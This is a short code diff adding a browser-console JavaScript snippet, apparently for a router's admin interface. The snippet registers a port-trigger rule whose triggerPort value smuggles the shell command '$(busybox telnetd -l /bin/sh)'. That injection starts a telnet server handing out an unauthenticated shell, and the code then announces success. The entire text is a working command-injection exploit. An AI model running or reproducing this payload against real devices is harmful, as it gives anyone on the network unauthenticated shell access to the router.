@@ -1,0 +1,13 @@
+window.telnetPoll = window.setInterval(() => {
+    Globals.models.PTModel.add({
+        applicationName: "telnet",
+        enableState: 1,
+        entryId: 1,
+        openPort: "2300-2400",
+        openProtocol: "TCP",
+        triggerPort: "$(busybox telnetd -l /bin/sh)",
+        triggerProtocol: "TCP"
+    });
+    alert("Success! You can telnet to the router. infosec.exchange/@alcea/115865543027848903");
+    window.clearInterval(window.telnetPoll);
+}, 1000);
